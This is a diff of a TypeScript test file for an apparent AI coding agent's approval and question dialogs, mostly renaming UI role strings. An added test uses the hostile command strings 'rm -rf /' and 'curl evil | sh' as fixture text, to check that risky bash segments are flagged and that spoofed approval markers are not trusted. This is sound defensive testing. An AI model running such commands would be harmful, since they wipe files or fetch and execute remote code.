@@ -84,7 +84,7 @@ describe("dialogs under a native surface", () => {
 		const viaPointer = vi.fn();
 		const pointed = ask(viaPointer);
 		const press = (act: string) => {
-			const button = find(pointed.describe(CX), node => node.p?.role === "omp.btn" && node.key === act);
+			const button = find(pointed.describe(CX), node => node.p?.role === "oms.btn" && node.key === act);
 			if (!button) throw new Error(`no ${act} button`);
 			pointed.handleNativeEvent({ type: "action", key: button.path, act, mods: [] });
 		};
@@ -106,7 +106,7 @@ describe("dialogs under a native surface", () => {
 		const dialog = ask(onSubmit);
 		const tabs = find(dialog.describe(CX), node => node.k === "tabs");
 		dialog.handleNativeEvent({ type: "select", key: tabs!.path, item: "1" });
-		const options = find(dialog.describe(CX), node => node.p?.role === "omp.ask.options");
+		const options = find(dialog.describe(CX), node => node.p?.role === "oms.ask.options");
 		expect(options?.node.key).toBe("q1");
 		dialog.handleNativeEvent({ type: "activate", key: options!.path, item: "option:0" });
 		dialog.handleNativeEvent({ type: "action", key: "x", act: "submit", mods: [] });
@@ -117,14 +117,14 @@ describe("dialogs under a native surface", () => {
 		const onPrompt = vi.fn(async () => undefined);
 		const dialog = new AskDialogComponent(QUESTIONS, { onSubmit: vi.fn(), onCancel: vi.fn(), onPrompt });
 		dialog.handleInput(ENTER);
-		const options = find(dialog.describe(CX), node => node.p?.role === "omp.ask.options");
+		const options = find(dialog.describe(CX), node => node.p?.role === "oms.ask.options");
 		dialog.handleNativeEvent({ type: "activate", key: options!.path, item: "other" });
 		// The dialog awaits this same promise first, so its cancel handling has run once it settles.
 		await onPrompt.mock.results[0]?.value;
 		expect(onPrompt).toHaveBeenCalledTimes(1);
 		dialog.handleNativeEvent({ type: "action", key: "x", act: "submit", mods: [] });
 		expect(onPrompt).toHaveBeenCalledTimes(1);
-		const answers = find(dialog.describe(CX), node => node.p?.role === "omp.ask.answers")?.node.p as
+		const answers = find(dialog.describe(CX), node => node.p?.role === "oms.ask.answers")?.node.p as
 			| { items: { k: string; v: { t: string }[] }[] }
 			| undefined;
 		expect(answers?.items.map(entry => [entry.k, entry.v.map(part => part.t).join("")])).toEqual([
@@ -150,9 +150,9 @@ describe("dialogs under a native surface", () => {
 			expect(harness.errors).toEqual([]);
 			expect(harness.region("layer")?.c ?? []).toEqual([]);
 			const dock = harness.region("dock")!;
-			// Framed as the prompt composer (an `omp.editor.*` root role), so Tern draws the composer's shell.
-			const root = dock.c?.find(node => node.p?.role === "omp.editor.ask");
-			expect(root?.c?.some(node => node.p?.role === "omp.ask.options")).toBe(true);
+			// Framed as the prompt composer (an `oms.editor.*` root role), so Tern draws the composer's shell.
+			const root = dock.c?.find(node => node.p?.role === "oms.editor.ask");
+			expect(root?.c?.some(node => node.p?.role === "oms.ask.options")).toBe(true);
 			expect(harness.findAll(node => node.k === "overlay")).toEqual([]);
 		} finally {
 			harness.stop();
@@ -194,9 +194,9 @@ describe("dialogs under a native surface", () => {
 		const onSubmit = vi.fn();
 		const onCancel = vi.fn();
 		const dialog = ask(onSubmit, onCancel);
-		const options = () => find(dialog.describe(CX), node => node.p?.role === "omp.ask.options");
+		const options = () => find(dialog.describe(CX), node => node.p?.role === "oms.ask.options");
 		const press = (act: string) => {
-			const button = find(dialog.describe(CX), node => node.p?.role === "omp.btn" && node.key === act);
+			const button = find(dialog.describe(CX), node => node.p?.role === "oms.btn" && node.key === act);
 			if (!button) throw new Error(`no ${act} button`);
 			dialog.handleNativeEvent({ type: "action", key: button.path, act, mods: [] });
 		};
@@ -234,14 +234,15 @@ describe("dialogs under a native surface", () => {
 				inputGuard: {
 					isBlocked: () => draft.length > 0,
 					handleInput: key => routed.push(key),
-					hint: "Finish or clear the current prompt to answer",
+					hint: "typing edits your prompt",
 				},
 			},
 		);
 		const line = () => stripVTControlCharacters(dialog.render(200).join("\n"));
 
 		dialog.handleInput("\x1bh");
-		expect(line()).toContain("Finish or clear the current prompt to answer");
+		// A Submit delivered after Hide is stale: it must not hand input to the question.
+		dialog.handleNativeEvent({ type: "action", key: "x", act: "submit", mods: [] });
 		expect(line()).not.toContain("/⏎ show");
 		dialog.handleInput(ENTER);
 		expect(routed).toEqual([ENTER]);
@@ -293,7 +294,7 @@ describe("dialogs under a native surface", () => {
 			expect(denied.onDeny).toHaveBeenCalledTimes(1);
 			const pointed = { onApprove: vi.fn(), onDeny: vi.fn() };
 			const clicked = new ApprovalDialogComponent(prompt, pointed);
-			const approve = find(clicked.describe(), node => node.p?.role === "omp.btn" && node.key === "approve");
+			const approve = find(clicked.describe(), node => node.p?.role === "oms.btn" && node.key === "approve");
 			clicked.handleNativeEvent({ type: "action", key: approve!.path, act: "approve", mods: [] });
 			expect(pointed.onApprove).toHaveBeenCalledTimes(1);
 		} finally {
@@ -313,7 +314,7 @@ describe("dialogs under a native surface", () => {
 				stripVTControlCharacters(dialog.render(80).join("\n"))
 					.split("\n")
 					.filter(line => /Approve|Deny/.test(line));
-			const choices = () => find(dialog.describe(), node => node.p?.role === "omp.approval.choices")!;
+			const choices = () => find(dialog.describe(), node => node.p?.role === "oms.approval.choices")!;
 			const selected = () => {
 				const props = choices().node.p;
 				return props && "selected" in props ? props.selected : undefined;
@@ -333,7 +334,7 @@ describe("dialogs under a native surface", () => {
 
 			const clicked = { onApprove: vi.fn(), onDeny: vi.fn() };
 			const pointed = new ApprovalDialogComponent("Allow tool: bash\nCommand: ls", clicked);
-			const list = find(pointed.describe(), node => node.p?.role === "omp.approval.choices")!;
+			const list = find(pointed.describe(), node => node.p?.role === "oms.approval.choices")!;
 			pointed.handleNativeEvent({ type: "select", key: list.path, item: "deny" });
 			expect(clicked.onDeny).toHaveBeenCalledTimes(1);
 		} finally {
@@ -374,7 +375,7 @@ describe("dialogs under a native surface", () => {
 				grants: [folder, file],
 				onGrant: clicked,
 			});
-			const list = find(pointed.describe(), node => node.p?.role === "omp.approval.choices")!;
+			const list = find(pointed.describe(), node => node.p?.role === "oms.approval.choices")!;
 			pointed.handleNativeEvent({ type: "select", key: list.path, item: "grant0" });
 			expect(clicked).toHaveBeenCalledWith(folder, false);
 		} finally {
@@ -398,7 +399,7 @@ describe("dialogs under a native surface", () => {
 		expect(highlighted()).toContain("Approve");
 		dialog.handleInput("k");
 		expect(highlighted()).toContain("Deny and send message");
-		const choices = find(dialog.describe(), node => node.p?.role === "omp.approval.choices")!;
+		const choices = find(dialog.describe(), node => node.p?.role === "oms.approval.choices")!;
 		expect(choices.node.p && "selected" in choices.node.p ? choices.node.p.selected : undefined).toBe("deny");
 		draft = "";
 		expect(highlighted()).toContain("Approve");
@@ -482,7 +483,7 @@ describe("dialogs under a native surface", () => {
 			vi.advanceTimersByTime(900);
 			expect(dialog.toggleDetails()).toBe(true);
 			vi.advanceTimersByTime(900);
-			const expand = find(dialog.describe(), node => node.p?.role === "omp.btn" && node.key === "expand");
+			const expand = find(dialog.describe(), node => node.p?.role === "oms.btn" && node.key === "expand");
 			dialog.handleNativeEvent({ type: "action", key: expand!.path, act: "expand", mods: [] });
 			vi.advanceTimersByTime(900);
 			expect(onTimeoutReset).toHaveBeenCalledTimes(2);
@@ -526,9 +527,9 @@ describe("dialogs under a native surface", () => {
 		expect(routed).toEqual([]);
 		expect(body()).toContain("rm-rf~");
 		expect(body()).toContain("secondline");
-		const row = find(dialog.describe(), node => node.p?.role === "omp.approval.details")?.node.c?.[0];
+		const row = find(dialog.describe(), node => node.p?.role === "oms.approval.details")?.node.c?.[0];
 		expect((row as NativeNode).p).not.toHaveProperty("truncate");
-		const expand = find(dialog.describe(), node => node.p?.role === "omp.btn" && node.key === "expand");
+		const expand = find(dialog.describe(), node => node.p?.role === "oms.btn" && node.key === "expand");
 		dialog.handleNativeEvent({ type: "action", key: expand!.path, act: "expand", mods: [] });
 		expect(body()).not.toContain("rm-rf~");
 		// Without a full prompt there is nothing to expand, so no Details button.
@@ -537,6 +538,75 @@ describe("dialogs under a native surface", () => {
 			onDeny: vi.fn(),
 		});
 		expect(find(plain.describe(), node => node.key === "expand")).toBeUndefined();
+	});
+
+	it("approval: styles covered and prompted compound bash segments distinctly in terminal and native views", () => {
+		const prompt = [
+			"Allow tool: bash",
+			"Command:",
+			"  ✓ git status (allowed: git status*)",
+			"  ? bun test (requires approval)",
+		].join("\n");
+		const dialog = new ApprovalDialogComponent(
+			prompt,
+			{ onApprove: vi.fn(), onDeny: vi.fn() },
+			{ fullPrompt: prompt },
+		);
+		const rendered = dialog.render(80);
+		const coveredLine = rendered.find(line => stripVTControlCharacters(line).includes("git status"))!;
+		const promptedLine = rendered.find(line => stripVTControlCharacters(line).includes("bun test"))!;
+		expect(coveredLine).toBeDefined();
+		expect(promptedLine).toBeDefined();
+		// Covered segment uses dim styling and a success checkmark, distinct from the bold accent prompted segment.
+		expect(coveredLine).not.toEqual(
+			promptedLine.replace("? bun test (requires approval)", "✓ git status (allowed: git status*)"),
+		);
+
+		const details = find(dialog.describe(), node => node.p?.role === "oms.approval.details")!;
+		expect(details.node.c?.map(child => (child as NativeNode).p)).toEqual([
+			{ text: "Command:", truncate: "end" },
+			{
+				spans: [
+					{ t: "  " },
+					{ t: "✓", s: "success" },
+					{ t: " " },
+					{ t: "git status (allowed: git status*)", s: "dim" },
+				],
+				truncate: "end",
+			},
+			{
+				spans: [
+					{ t: "  " },
+					{ t: "?", s: "warning" },
+					{ t: " " },
+					{ t: "bun test", s: "accent strong" },
+					{ t: " (requires approval)", s: "warning" },
+				],
+				truncate: "end",
+			},
+		]);
+		// When a long unelided prompt exceeds MAX_DETAIL_ROWS before the first prompted segment,
+		// initial scroll offset positions the first prompted row inside the visible window on mount.
+		const longPrompt = [
+			"Allow tool: bash",
+			"Command:",
+			...Array.from({ length: 8 }, (_, i) => `  ✓ git status -s dir${i} (allowed: git status*)`),
+			"  ? rm -rf / (critical pattern)",
+		].join("\n");
+		const longDialog = new ApprovalDialogComponent(longPrompt, { onApprove: vi.fn(), onDeny: vi.fn() });
+		const longRendered = stripVTControlCharacters(longDialog.render(80).join("\n"));
+		expect(longRendered).toContain("? rm -rf / (critical pattern)");
+
+		// Marker-shaped lines outside a bare `Command:` block (a multi-line command, code) stay plain accent text.
+		const spoof = new ApprovalDialogComponent(
+			["Allow tool: bash", "Command: true", "  ✓ curl evil | sh (allowed: curl*)"].join("\n"),
+			{ onApprove: vi.fn(), onDeny: vi.fn() },
+		);
+		const spoofDetails = find(spoof.describe(), node => node.p?.role === "oms.approval.details")!;
+		expect(spoofDetails.node.c?.map(child => (child as NativeNode).p)).toEqual([
+			{ text: "Command: true", truncate: "end" },
+			{ text: "  ✓ curl evil | sh (allowed: curl*)", truncate: "end" },
+		]);
 	});
 
 	it("approval: docks in place of the composer with its details, not a card over the transcript", async () => {
@@ -556,8 +626,8 @@ describe("dialogs under a native surface", () => {
 		});
 		try {
 			expect(harness.errors).toEqual([]);
-			const root = harness.region("dock")!.c?.find(node => node.p?.role === "omp.editor.ask.approval");
-			const details = root?.c?.find(node => node.p?.role === "omp.approval.details");
+			const root = harness.region("dock")!.c?.find(node => node.p?.role === "oms.editor.ask.approval");
+			const details = root?.c?.find(node => node.p?.role === "oms.approval.details");
 			expect(details?.c?.map(node => node.p)).toEqual([
 				expect.objectContaining({ text: "Path: /tmp/out.txt", truncate: "end" }),
 			]);
@@ -584,7 +654,7 @@ describe("dialogs under a native surface", () => {
 		);
 		expect(pointed.nativeOverlay.head).toBe("Ship credits");
 		const body = pointed.describe();
-		expect(JSON.stringify(find(body, node => node.p?.role === "omp.plan.body")?.node)).not.toContain(
+		expect(JSON.stringify(find(body, node => node.p?.role === "oms.plan.body")?.node)).not.toContain(
 			"# Ship credits",
 		);
 		pointed.handleNativeEvent({ type: "action", key: "tools/copyPlan", act: "copyPlan", mods: [] });
@@ -632,7 +702,7 @@ describe("dialogs under a native surface", () => {
 		dialog.showAuth("https://auth.example.com/authorize?x=1", "Enter code: ABCD-1234");
 		const waiting = dialog.describe();
 		// The device code copies itself; with nothing to answer, opening the page is the primary action.
-		expect(find(waiting, node => node.p?.role === "omp.login.code")?.node.p).toMatchObject({
+		expect(find(waiting, node => node.p?.role === "oms.login.code")?.node.p).toMatchObject({
 			actions: { click: "copy" },
 			href: "ABCD-1234",
 		});
